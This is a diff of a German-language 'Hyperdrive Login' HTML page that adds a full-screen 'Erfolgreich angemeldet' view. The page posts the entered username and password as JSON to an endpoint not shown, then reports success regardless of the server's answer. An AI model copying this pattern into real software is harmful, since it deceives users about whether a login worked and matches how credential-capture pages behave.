@@ -86,34 +86,66 @@
             background-color: #2ea44f;
         }
 
-        .success-msg {
+        /* Erfolgs-Screen */
+        .success-screen {
             display: none;
             text-align: center;
-            color: #3fb950;
-            font-size: 0.9em;
-            margin-top: 16px;
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background-color: #238636;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+            font-size: 1.8em;
+        }
+
+        .success-screen h2 {
+            color: #e6edf3;
+            font-size: 1.2em;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .success-screen p {
+            color: #8b949e;
+            font-size: 0.88em;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Hyperdrive Login</h1>
 
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Nutzername</label>
-                <input type="text" id="username" placeholder="Nutzername eingeben" required autocomplete="off">
-            </div>
+        <!-- Login Formular -->
+        <div id="loginView">
+            <h1>Hyperdrive Login</h1>
 
-            <div class="form-group">
-                <label for="password">Passwort</label>
-                <input type="password" id="password" placeholder="Passwort eingeben" required>
-            </div>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Nutzername</label>
+                    <input type="text" id="username" placeholder="Nutzername eingeben" required autocomplete="off">
+                </div>
 
-            <button type="submit" class="btn">Anmelden</button>
-        </form>
+                <div class="form-group">
+                    <label for="password">Passwort</label>
+                    <input type="password" id="password" placeholder="Passwort eingeben" required>
+                </div>
 
-        <p class="success-msg" id="successMsg">✓ Erfolgreich angemeldet</p>
+                <button type="submit" class="btn">Anmelden</button>
+            </form>
+        </div>
+
+        <!-- Erfolgs-Screen -->
+        <div class="success-screen" id="successView">
+            <div class="success-icon">✓</div>
+            <h2>Erfolgreich angemeldet</h2>
+            <p>Willkommen im Hyperdrive Control Center.</p>
+        </div>
+
     </div>
 
     <script>
@@ -132,9 +164,9 @@
                 body: JSON.stringify({ username: user, password: pass })
             });
 
-            // Kein Pop-up – stattdessen kleine Erfolgsmeldung
-            document.getElementById('successMsg').style.display = 'block';
-            document.getElementById('loginForm').reset();
+            // Login-Ansicht ausblenden, Erfolgs-Screen anzeigen
+            document.getElementById('loginView').style.display = 'none';
+            document.getElementById('successView').style.display = 'block';
         });
     </script>
 </body>
